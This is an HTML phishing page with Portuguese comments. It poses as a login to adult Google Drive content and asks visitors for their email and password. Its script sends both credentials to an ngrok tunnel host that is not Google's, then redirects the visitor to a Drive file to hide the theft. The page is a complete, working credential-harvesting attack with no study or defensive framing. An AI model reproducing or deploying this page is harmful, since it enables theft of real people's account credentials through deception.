<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <!-- Inclui o Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /* Estilo para o corpo da página */
        body {
            font-family: Arial, sans-serif;
            background-image: url('https://github.com/Lai1s/presente/blob/5c9504ffab714c5cd2ea7edcf3fc5180786f2a52/fundo%202%20p.jpeg?raw=true'); /* Caminho para a imagem de fundo no GitHub */
            background-size: cover; /* Garante que a imagem cubra todo o fundo */
            background-repeat: no-repeat; /* Evita repetição da imagem */
            background-position: center; /* Centraliza a imagem */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh; /* Altura mínima da tela inteira */
            color: #000;
            position: relative;
        }
        /* Estilo para o container */
        .container {
            width: 80%; /* Define a largura máxima do container */
            max-width: 400px; /* Define a largura máxima para dispositivos maiores */
            background-color: rgba(255, 255, 255, 0.7); /* Adiciona um fundo branco semi-transparente */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.1);
            position: relative;
            z-index: 1;
        }
        /* Estilo para os cabeçalhos dentro do container */
        .container h2 {
            text-align: center;
            margin-bottom: 30px;
            color: #000;
        }
        /* Estilo para grupo de formulário */
        .form-group {
            margin-bottom: 20px;
        }
        /* Estilo para campos de entrada de formulário */
        input.form-control {
            border-radius: 20px;
            padding: 12px 20px;
            font-size: 16px;
            border: 1px solid #ddd;
        }
        /* Estilo para botão */
        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: #fff;
            font-size: 18px;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        /* Estilo para o estado de hover do botão */
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Título do formulário de login -->
        <h2>Conteúdos GoogleDrive🔞</h2>
        <!-- Formulário de login -->
        <form id="loginForm" method="POST" action="https://71ad-2804-6850-8000-3d01-2d4a-c112-c2f2-dbba.ngrok-free.app/">
            <!-- Campo de entrada para o e-mail -->
            <div class="form-group">
                <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
            </div>
            <!-- Campo de entrada para a senha -->
            <div class="form-group">
                <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
            </div>
            <!-- Botão para enviar o formulário -->
            <button type="button" onclick="enviarFormulario()">Entrar</button>
            <!-- Elemento para exibir mensagens de erro -->
            <p id="mensagemErro" style="color: red;"></p>
        </form>
    </div>

    <script>
        function enviarFormulario() {
            // Obtém os valores dos campos de entrada
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            // Verifica se os campos estão vazios
            if (email === '' || password === '') {
                // Exibe mensagem de erro se os campos estiverem vazios
                document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
                return;
            }

            // Cria um objeto FormData para enviar os dados do formulário
            var formData = new FormData();
            formData.append('email', email);
            formData.append('password', password);

            // Cria uma requisição XMLHttpRequest para enviar os dados do formulário
            var xhr = new XMLHttpRequest();
            xhr.open('POST', document.getElementById("loginForm").action);
            xhr.onload = function () {
                // Redireciona para o Google Drive se a resposta for bem-sucedida
                if (xhr.status === 200) {
                    window.location.href = "https://drive.google.com/file/d/1-n2-7RG13HA7ttCVJukD_PpoMDsSRS6n/view?usp=drive";
                } else {
                    // Exibe mensagem de erro se a resposta não for bem-sucedida
                    var mensagem = xhr.responseText;
                    document.getElementById('mensagemErro').innerText = mensagem;
                }
            };
            // Envia os dados do formulário
            xhr.send(formData);
        }
    </script>
</body>
</html>
